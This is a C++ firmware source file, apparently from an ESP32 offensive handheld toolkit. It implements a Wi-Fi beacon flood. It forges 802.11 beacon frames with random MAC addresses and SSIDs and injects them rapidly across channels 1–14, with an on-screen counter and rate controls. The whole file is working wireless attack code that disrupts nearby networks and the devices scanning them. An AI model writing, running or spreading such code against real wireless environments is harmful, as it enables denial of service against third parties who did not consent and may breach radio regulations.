#if !LITE_VERSION
#include "arsenal.h"
#include "arsenal_background.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

static uint8_t flood_beacon[] = {
    0x80, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x11, 0x00,
    0x00, 0x08,
    'F', 'L', 'O', 'O', 'D', '_', '0', '0'
};

static void randomMAC(uint8_t *dest) {
    for (int i = 0; i < 6; i++) dest[i] = random(256);
    dest[0] |= 0x02;
    dest[0] &= 0xFE;
}

void arsenal_beacon_flood(void) {
    ARSENAL_HEAP_CHECK();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    int sent = 0;
    int channel = 1;
    int rate = 10;
    unsigned long startTime = millis();

    while (true) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        for (int i = 0; i < rate; i++) {
            randomMAC(flood_beacon + 10);
            memcpy(flood_beacon + 16, flood_beacon + 10, 6);
            for (int j = 0; j < 8; j++) {
                flood_beacon[38 + j] = 'A' + random(26);
            }
            esp_wifi_80211_tx(WIFI_IF_STA, flood_beacon, sizeof(flood_beacon), false);
            sent++;
        }

        channel = (channel % 14) + 1;

        if (sent % 50 == 0) {
            drawMainBorderWithTitle("Beacon Flood");
            int y = 45;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, y);
            tft.printf("Frames: %d", sent);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Channel: %d", channel);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Rate: %d/iter", rate);
            y += 14;
            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(12, y);
            tft.printf("Time: %lus", elapsed);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc:stop  Up/Dn:rate"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) break;
        if (check(UpPress) || check(NextPress)) { rate += 5; if (rate > 50) rate = 50; }
        if (check(DownPress) || check(PrevPress)) { rate -= 5; if (rate < 1) rate = 1; }

        esp_task_wdt_reset();
        delay(30);
    }

    esp_wifi_set_promiscuous(false);
}
#endif
